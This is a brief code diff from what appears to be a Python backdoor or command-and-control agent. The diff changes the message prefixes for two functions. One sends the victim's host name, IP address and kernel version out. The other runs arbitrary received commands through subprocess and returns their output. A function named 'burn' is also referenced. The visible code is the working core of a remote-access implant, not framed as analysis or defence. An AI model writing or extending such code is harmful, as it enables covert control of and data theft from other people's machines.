@@ -54,7 +54,7 @@ def handle_ping():
 
 def send_info():
     resp = platform.node()+" "+get_if_addr(conf.iface)+" "+platform.uname().release
-    send(resp)
+    send("st:"+resp)
     pass
 
 
@@ -67,7 +67,7 @@ def burn():
 def arbitrary_exec(command: str):
     logging.info("running command {}".format(command))
     cmd = command.split(" ")
-    send(subprocess.check_output(cmd))
+    send("abx:"+subprocess.check_output(cmd))
     pass
 
 
